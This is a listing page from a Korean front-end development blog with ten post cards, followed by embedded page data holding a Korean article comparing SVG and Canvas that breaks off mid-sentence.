<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><title>allround-coder</title><meta name="description" content="I develop websites, games and apps with HTML, CSS and JS."/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:url" content="https://allround-coder.github.io///posts/144" data-gatsby-head="true"/><meta property="og:type" content="website" data-gatsby-head="true"/><meta property="og:site_name" content="allround-coder" data-gatsby-head="true"/><meta property="og:title" content="allround-coder" data-gatsby-head="true"/><meta property="og:description" content="I develop websites, games and apps with HTML, CSS and JS." data-gatsby-head="true"/><meta property="og:image" content="/favicons/ms-icon-310x310.png" data-gatsby-head="true"/><meta property="og:locale" content="en_US" data-gatsby-head="true"/><meta name="twitter:card" content="summary_large_image" data-gatsby-head="true"/><meta property="twitter:domain" content="https://allround-coder.github.io/" data-gatsby-head="true"/><meta property="twitter:url" content="https://allround-coder.github.io///posts/144" data-gatsby-head="true"/><meta name="twitter:title" content="allround-coder" data-gatsby-head="true"/><meta name="twitter:description" content="I develop websites, games and apps with HTML, CSS and JS." data-gatsby-head="true"/><meta name="twitter:image" content="/favicons/ms-icon-310x310.png" data-gatsby-head="true"/><meta name="twitter:data1" content="Dev | allround-coder" data-gatsby-head="true"/><meta name="next-head-count" content="18"/><meta name="google-site-verification" content="a-yehRo3k3xv7fg6LqRaE8jlE42e5wP2bDE_2F849O4"/><link rel="stylesheet" href="/favicons/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/assets/favicons/favicon-96x96.png"/><link rel="icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-startup-image" href="/startup.png"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="msapplication-config" content="/favicons/browserconfig.xml"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-ZFDEQ947R4"></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
  
            gtag('config', 'G-ZFDEQ947R4');</script><link rel="preload" href="/_next/static/css/6e57edcf9f2ce551.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e57edcf9f2ce551.css" data-n-g=""/><link rel="preload" href="/_next/static/css/a22d13b8e6bc8203.css" as="style"/><link rel="stylesheet" href="/_next/static/css/a22d13b8e6bc8203.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-ee6df16fdc6dae4d.js" defer=""></script><script src="/_next/static/chunks/framework-46611630e39cfdeb.js" defer=""></script><script src="/_next/static/chunks/main-cf4a52eec9a970a0.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6fae11262ee5c69b.js" defer=""></script><script src="/_next/static/chunks/75fc9c18-ac4aa08aae62f90e.js" defer=""></script><script src="/_next/static/chunks/463-0429087d4c0b0335.js" defer=""></script><script src="/_next/static/chunks/873-ec7535a55e788b31.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bpage%5D-cd321dee6458c228.js" defer=""></script><script src="/_next/static/t9N7vwmpvBMQnO2PSctoH/_buildManifest.js" defer=""></script><script src="/_next/static/t9N7vwmpvBMQnO2PSctoH/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="posts_container__s9Z_H posts_-list__bsl0U"><header class="Header_header__Z8PUO"><div class="Header_inner__tfr0u"><strong class="Header_title__Otn70"><a href="/">Allround Coder</a></strong><nav class="Header_nav_area__6KVpk"><a class="nav_item" href="/posts/1">Posts</a></nav></div></header><div class="posts_inner__HIBjT"><article><h2 class="SectionTitle_section_title__HS_xr">Posts</h2><div class="posts_project_list__oDV_y"><div class="PostList_post_list__or0rl"><a class="PostList_post_item__gAdVi" aria-label="개발자가 알아둬야할 SVG와 캔버스 비교 정리" href="/post/2024-05-02-SVGVsCanvasAComparison"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="개발자가 알아둬야할 SVG와 캔버스 비교 정리" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-SVGVsCanvasAComparison_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="개발자가 알아둬야할 SVG와 캔버스 비교 정리" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">개발자가 알아둬야할 SVG와 캔버스 비교 정리</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">15<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="웹 워커 관련 프론트엔드 면접 질문" href="/post/2024-05-02-WebWorkersInterviewQuestions"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="웹 워커 관련 프론트엔드 면접 질문" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-WebWorkersInterviewQuestions_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="웹 워커 관련 프론트엔드 면접 질문" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">웹 워커 관련 프론트엔드 면접 질문</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">6<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="HTML &lt;dialog&gt; 요소를 사용한 JavaScript와 React에서의 모달(dialog)" href="/post/2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="HTML &lt;dialog&gt; 요소를 사용한 JavaScript와 React에서의 모달(dialog)" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="HTML &lt;dialog&gt; 요소를 사용한 JavaScript와 React에서의 모달(dialog)" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">HTML &lt;dialog&gt; 요소를 사용한 JavaScript와 React에서의 모달(dialog)</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">4<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="CSS 캐스케이드 레이어: 새로운 CSS 기능에 대한 가이드(2024년)" href="/post/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="CSS 캐스케이드 레이어: 새로운 CSS 기능에 대한 가이드(2024년)" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="CSS 캐스케이드 레이어: 새로운 CSS 기능에 대한 가이드(2024년)" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">CSS 캐스케이드 레이어: 새로운 CSS 기능에 대한 가이드(2024년)</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">4<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="HTMX를 활용해 쉬운 페이지 라우팅하기" href="/post/2024-05-02-EffortlessPageRoutingUsingHTMX"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="HTMX를 활용해 쉬운 페이지 라우팅하기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-EffortlessPageRoutingUsingHTMX_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="HTMX를 활용해 쉬운 페이지 라우팅하기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">HTMX를 활용해 쉬운 페이지 라우팅하기</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">7<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기" href="/post/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">2<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="HTML 삽입 (페이로드 목록)" href="/post/2024-05-02-HTMLINJECTIONPayloadList"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="HTML 삽입 (페이로드 목록)" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="HTML 삽입 (페이로드 목록)" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">HTML 삽입 (페이로드 목록)</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="CSS 기초 문법 정리" href="/post/2024-05-02-IntroductiontoCSSSyntax"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="CSS 기초 문법 정리" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-IntroductiontoCSSSyntax_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="CSS 기초 문법 정리" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">CSS 기초 문법 정리</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">1<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기" href="/post/2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">2<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지" href="/post/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지</strong><div class="PostList_meta__VCFLX"><span class="date">May 1, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a></div></div></article><div class="posts_pagination__R_03T"><button type="button" class="page_button -prev">&lt;</button><a class="link" href="/posts/141">141</a><a class="link" href="/posts/142">142</a><a class="link" href="/posts/143">143</a><a class="link posts_-active__YVJEi" href="/posts/144">144</a><a class="link" href="/posts/145">145</a><a class="link" href="/posts/146">146</a><a class="link" href="/posts/147">147</a><a class="link" href="/posts/148">148</a><a class="link" href="/posts/149">149</a><a class="link" href="/posts/150">150</a><a class="link" href="/posts/151">151</a></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"posts":[{"title":"개발자가 알아둬야할 SVG와 캔버스 비교 정리","description":"","date":"2024-05-02 00:10","slug":"2024-05-02-SVGVsCanvasAComparison","content":"\n\n\n![SVG vs Canvas](/assets/img/2024-05-02-SVGVsCanvasAComparison_0.png)\n\n웹 그래픽 및 이미지를 표시하는 데 가장 널리 사용되는 두 가지 기술은 SVG와 Canvas입니다. 이 둘 모두 매력적인 웹 경험을 만들기 위한 웹 표준입니다. SVG는 해상도에 독립적이며 모양, 선 및 텍스트로 구성되어 있어 화질을 잃지 않고 확대 또는 축소할 수 있습니다. SVG 그래픽 및 이미지는 상호작용, 데이터 주도형 및 맞춤형 애플리케이션에 이상적입니다. 반면에 비트맵은 해상도 의존적인 래스터 그래픽 API인 Canvas에 이미지 데이터를 저장하는 데 사용됩니다. 웹 페이지에 모양과 이미지를 그리는 것은 흔한 실천법이며, 상호작용 게임, 애니메이션 및 시각화를 만들기 쉽습니다.\n\n# SVG와 Canvas란 무엇인가요?\n\n대부분의 최신 브라우저는 XML 기반의 벡터 그래픽 형식인 SVG를 지원합니다. 픽셀화 없이 크기를 조절할 수 있는 간단한 그래픽 및 다이어그램을 만드는 데 효과적입니다. 또한 JavaScript를 사용하여 SVG를 통해 상호작용 그래픽을 생성할 수 있습니다. SVG는 XML 표준에 의존하는 2차원 벡터 이미지 형식입니다. 웹 디자인 및 개발에서 로고, 다이어그램 및 아이콘과 같은 벡터 그래픽을 만들거나 관리하기 위해 자주 사용됩니다. 기존의 JPEG, PNG 및 GIF와 같은 래스터 이미지와는 달리 SVG 이미지는 화질을 희생하지 않고 비율을 변경할 수 있어 웹사이트와 다양한 해상도를 가진 기기에서 이미지를 표시하는 데 더 나은 선택입니다. 또한 SVG 이미지는 압축되어 있어 래스터 이미지보다 빠르게 로드됩니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nCanvas는 웹을 위한 동적 대화형 그래픽을 만들 수 있게 해주는 HTML5 기능입니다. 래스터 기반인 Canvas는 더 복잡한 시각화와 애니메이션을 생성하기에 적합하기 때문에 데이터 시각화와 같은 작업에 가장 적합합니다. 그러나 SVG와는 달리 Canvas는 픽셀 기반 형식이기 때문에 이미지를 Canvas에 너무 많이 확대하면 픽셀화될 수 있습니다. Canvas는 해상도에 따라 동적으로 그래픽, 게임 그래픽 및 다른 시각적 요소를 표시하는 비트맵 캔버스를 제공합니다. JavaScript를 사용하여 웹사이트에 직접 그래픽을 그릴 수 있습니다. Canvas 요소는 단지 그래픽을 보관하는 공간에 불과합니다.\n\nSVG와 Canvas의 주요 차이점은 SVG가 벡터 기반 이미지 형식을 사용한다는 점이며, Canvas는 래스터 기반 이미지 형식을 사용한다는 것입니다. SVG 이미지를 구성하는 선, 곡선 및 모양인 Path는 수학적 방정식을 사용하여 생성됩니다. 이로 인해 이러한 요소들은 쉽게 조작하고 무한히 확대할 수 있습니다. 반면에 Canvas 이미지는 픽셀로 구성되어 있으며, 이미지를 만들기 위해 서로 옆에 배열된 작은 색깔의 정사각형입니다. Canvas 이미지는 해상도에 따라 의존하기 때문에 확대되면 픽셀화되어 흐릿해집니다.\n\n# SVG와 Canvas 사용의 제약사항\n\nSVG 및 Canvas는 모두 대화형 그래픽을 생성하는 강력한 도구지만, 사용할 때 고려해야 할 몇 가지 제한 사항이 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nSVG는 복잡한 모양과 상호 작용을 생성하는 기능이 제한적이며 이미지를 구성하는 개별 요소를 변형하고 조작하기 위해 DOM 기반 시스템에 의존하기 때문에 한계가 있습니다. 또한 대량의 데이터를 효율적으로 처리할 수 없기 때문에 SVG는 매우 다이내믹한 애니메이션을 만드는 데 적합하지 않습니다.\n\n한편 Canvas는 이미지를 더 직접적으로 렌더링하고 복잡한 모양에 더 적합합니다. 또한 SVG보다 빠르며 빠른 애니메이션에 적합합니다. 다만 Canvas는 SVG보다 DOM 기반 구조가 없어 그래픽을 조작하는 데 효과적이지 않습니다. 또한 Canvas가 제공하는 제한된 접근성 지원으로 모든 사용자에게 콘텐츠에 액세스를 보장하기가 더 어렵습니다.\n\n# 비교: SVG 대 Canvas\n\n이 섹션에서는 SVG와 Canvas를 자세히 비교해보겠습니다. 이 섹션에서 많은 것을 배울 수 있습니다. 확장성, 크기 및 로드 시간, 상호 작용, 성능, 접근성, 학습 곡선 및 인기를 기준으로 비교할 것입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 확장성\n\n가장 인기 있는 두 벡터 그래픽 표준은 SVG와 Canvas입니다. 두 표준 모두 벡터 그래픽을 만드는 데 사용되지만 같지는 않습니다. 이 글에서는 SVG와 Canvas의 확장성을 비교할 것입니다.\n\n**SVG**  \nSVG의 확장성은 일반적으로 벡터 그래픽을 만들기에는 Canvas보다 우수하다고 여겨집니다. SVG는 해상도에 독립적인 벡터 그래픽 형식이기 때문에 품질을 잃지 않고 확대 또는 축소할 수 있습니다. 추가로 상호 작용과 애니메이션을 지원할 수 있습니다.\n\n**Canvas**  \n반면에 Canvas는 해상도에 독립적인 래스터 그래픽 형식입니다. 이는 SVG만큼 쉽게 조절할 수 없기 때문에 그래픽이 확대되면 품질이 저하됩니다. Canvas에는 필터와 마스크와 같은 효과를 지원하는 기능이 내장되어 있지 않습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 크기와 로드 시간\n\nSVG와 Canvas를 그래픽 표현에 사용할 때 고려해야 할 다양한 요소가 있습니다. 크기, 로드 시간 및 호환성 등이 그 중 하나입니다.\n\nSVG SVG 파일의 크기가 작기 때문에, 많은 그래픽 콘텐츠가 있는 웹 페이지에 이상적입니다. 또한 텍스트 기반이며 브라우저에서 처리되기 때문에 빨리 로드됩니다. SVG는 모든 최신 브라우저와 호환되지만, 구식 버전과의 하위 호환성을 보장하려면 추가 작업이 필요할 수 있습니다.\n\nCanvas Canvas 요소는 일반적으로 SVG 파일보다 상당히 큽니다. 결과적으로 로드하는 데 시간이 더 걸리고 웹 페이지 성능이 저하될 수 있습니다. 그러나 크기가 불리하더라도 Canvas는 애니메이션 및 상호 작용을 지원하기 때문에 그래픽 표현에 대한 인기가 여전합니다. Canvas도 모든 최신 브라우저와 호환되며, 하위 호환성에 대한 추가 작업이 필요하지 않습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n클라이맥스에서는 크기와 로드 시간 측면에서 SVG가 더 나은 선택입니다. 더 작은 파일 크기와 빠른 로딩 시간 때문에, 그래픽 콘텐츠가 많은 웹 페이지에는 더 나은 선택입니다. 반면에 캔버스는 애니메이션 및 상호작용과 같은 보다 고급 기능이 필요할 때 더 나은 선택일 수 있습니다.\n\n# 상호작용\n\nSVG와 캔버스를 비교하는 것은 이 두 가지 강력한 기술 사이의 차이를 이해하는 핵심 단계입니다. SVG와 캔버스 모두 이차원 그래픽을 만드는 데 사용되지만, 상호작용 측면에서는 큰 차이가 있습니다.\n\nSVG는 선언적 언어의 한 예로, 요소와 해당 동작을 코드 내에서 직접 정의할 수 있습니다. 이를 통해 개발자들은 벡터 그래픽에 상호작용 요소를 손쉽게 통합할 수 있습니다. 예를 들어, 개발자들은 SVG 요소에 여러 이벤트를 바인딩할 수 있으며, 마우스 클릭, 키 입력 및 기타 사용자 상호작용과 같은 것들입니다. 게다가 SVG는 다양한 애니메이션 효과를 지원하며, 이를 활용하여 동적이고 매력적인 사용자 경험을 만들 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n캔버스는 절차 지향 언어로, 개발자로부터 원하는 동작을 수행하도록 지시를 필요로 합니다. 이로 인해 상호 작용적인 작업에 대해 사용하기가 어려워지며, 개발자들은 각 요소에 대한 해당 동작을 수동으로 코딩해야 합니다. 그러나 캔버스는 SVG보다 몇 가지 장점을 가지고 있습니다. 비트맵 이미지를 그리고 3D 효과를 생성할 수 있는 기능이 있습니다.\n\n# 성능\n\nSVG와 캔버스의 성능을 대조할 때 고려해야 할 다양한 요소가 있습니다. 확장 가능한 벡터 그래픽인 SVG는 XML을 기반으로 하는 벡터 이미지 형식입니다. 이는 오픈 표준이므로 누구나 SVG 파일을 생성하고 활용할 수 있습니다. JavaScript API를 사용하여 상호 작용 이미지, 애니메이션 및 게임을 만들 수 있습니다. 이는 HTML5 요소 중 하나인 캔버스를 이용하여 가능합니다.\n\n일반적으로 모양과 간단한 그림에 대한 성능 면에서 SVG가 캔버스보다 우월합니다. SVG 파일은 해상도에 독립적이므로 품질을 희생하지 않고 크기를 조정할 수 있습니다. 게다가 SVG 이미지는 브라우저의 메모리에 캐시될 수 있어 로딩 시간을 단축시킬 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n캔버스는 보통 복잡한 그림과 애니메이션에 대해 더 나은 성능을 발휘합니다. 캔버스를 사용하면 이미지를 빠르게 그리고 품질 손실 없이 그릴 수 있습니다. 게다가 JavaScript API는 캔버스 조작을 최적화하여 더 빠른 애니메이션을 가능하게 합니다. 마지막으로, 어떤 사용 사례에 따라 다릅니다. 형태와 간단한 그림을 다룬다면 SVG를 선택하는 것이 좋습니다. 캔버스는 보다 복잡한 그림과 애니메이션에 대한 더 나은 선택일 수 있습니다.\n\n# 접근성\n\n접근성 측면에서 SVG와 캔버스는 둘 다 유효한 옵션입니다. 이 섹션에서는 SVG와 캔버스의 접근성에 대해 이야기하겠습니다.\n\nSVG는 벡터 기반 기술로, 해상도에 독립적입니다. 이것은 이미지가 다양한 화면 크기로 자동 조정되므로 반응형 웹사이트에 이상적입니다. SVG 이미지는 텍스트 기반이므로 기본적으로 접근할 수 있으며, 화면 판독기로 읽힐 수 있습니다. 개발자는 또한 SVG 코드의 요소에 속성을 추가하여 더 많은 접근성을 확보할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n캔버스는 해상도에 따라 달라지는 래스터 기반 기술입니다. 그 결과, 캔버스 이미지는 고해상도 장치에서 더 잘 보입니다. 캔버스 이미지는 기본적으로 접근할 수 없지만 개발자가 ARIA 속성을 사용하여 접근 가능하게 만들 수 있습니다. 이러한 속성은 페이지의 모든 상호작용 요소에 적용되어야 합니다.\n\n요약하면, SVG와 캔버스는 모두 적절한 코딩으로 접근 가능하게 만들 수 있는 웹 그래픽 옵션입니다. 적합한 기술은 사용하려는 그래픽의 유형과 장치에 따라 결정됩니다.\n\n# 학습 곡선\n\n캔버스와 SVG(확장 가능한 벡터 그래픽) 학습 곡선은 사용자가 프로그래밍 원칙에 얼마나 익숙한지에 따라 크게 달라질 수 